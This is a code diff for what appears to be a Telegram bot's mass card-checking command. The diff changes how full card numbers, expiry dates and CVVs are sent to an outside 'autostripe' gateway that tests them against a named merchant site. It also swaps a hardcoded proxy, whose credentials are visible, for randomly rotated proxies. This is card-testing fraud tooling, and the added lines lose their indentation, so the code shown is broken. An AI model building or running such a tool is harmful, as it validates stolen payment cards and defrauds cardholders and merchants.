@@ -9,6 +9,7 @@ sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from utils.database import get_credits, set_credits, get_plan, is_premium
 from utils.bin_database import get_bin_info
 from config import ADMIN_ID
+from config import get_random_proxy
 
 def setup_mass_check_command(bot):
     @bot.message_handler(commands=['ms'])
@@ -216,9 +217,9 @@ def process_single_card(card_data, card_number):
         if not (cvv.isdigit() and len(cvv) in [3, 4]):
             return f"❌ Tarjeta {card_number}: CVV inválido", False
         
-        # Construir URL de Stripe
-        stripe_url = f"https://rockyysoon.onrender.com/gateway=autostripe/key=rockysoon?site=buildersdiscountwarehouse.com.au&cc={cc_number}|{expiry_month}|{formatted_year}|{cvv}&proxy=p.webshare.io:80:bhiyynnu-rotate:hq37ts3k50kz"
-        
+        # Construir URL de Stripe CON PROXY ALEATORIO
+proxy = get_random_proxy()
+stripe_url = f"https://rockyysoon.onrender.com/gateway=autostripe/key=rockysoon?site=buildersdiscountwarehouse.com.au&cc={cc_number}|{expiry_month}|{formatted_year}|{cvv}&proxy={proxy}"
         # Hacer la solicitud
         response = make_simple_request(stripe_url)
         
